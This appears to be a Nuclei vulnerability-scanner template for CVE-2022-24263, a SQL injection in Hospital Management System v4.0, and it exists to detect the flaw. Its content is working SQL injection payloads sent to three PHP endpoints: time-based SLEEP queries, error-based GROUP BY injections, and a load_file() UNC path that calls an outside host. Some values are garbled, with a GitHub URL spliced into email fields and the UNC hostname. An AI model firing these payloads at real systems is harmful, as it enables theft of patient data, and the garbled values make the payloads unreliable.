id: CVE-2022-24263

info:
  name: Hospital Management System v4.0 SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: SQL injection vulnerability in Hospital Management System v4.0 in various parameters across multiple files.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Implement input validation and parameterized queries to prevent SQL Injection attacks.

http:
  - method: POST
    path:
      - "{{BaseURL}}/Hospital-Management-System-master/func.php"

    body: |
      txtName={{randstr}}' AND (SELECT 9346 FROM (SELECT(SLEEP(3)))HJGv) AND 'xkCZ'='xkCZ&txtEmail=xstxPhYW@https://github.com/kishan0725/Hospital-Management-System&txtPhone=813-439-23'+(select load_file('\\\\k0lnu24kl14z5bxcoo5tj7z4bvho5fz3q6ey1qpf.https://github.com/kishan0725/Hospital-Management-System\\hgq'))+'&btnSubmit=Send Message&txtMsg=441931

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"

  - method: POST
    path:
      - "{{BaseURL}}/Hospital-Management-System-master/contact.php"

    body: |
      email={{randstr}}@https://github.com/kishan0725/Hospital-Management-System'+(select-2936) OR 1 GROUP BY CONCAT(0x7162706271,(SELECT (CASE WHEN (5080=5080) THEN 1 ELSE 0 END)),0x716b767a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#from(select(sleep(20)))a)+'&password2=d3U!l9k!E4&patsub=Login

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"

  - method: POST
    path:
      - "{{BaseURL}}/Hospital-Management-System-master/func3.php"

    body: |
      username3={{randstr}}'+(select-2423) OR 1 GROUP BY CONCAT(0x71626a6271,(SELECT (CASE WHEN (5907=5907) THEN 1 ELSE 0 END)),0x716b766b71,FLOOR(RAND(0)*2)) HAVING MIN(0)#from(select(sleep(20)))a)+'&password3=a5B!n6f!U1&docsub1=Login

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
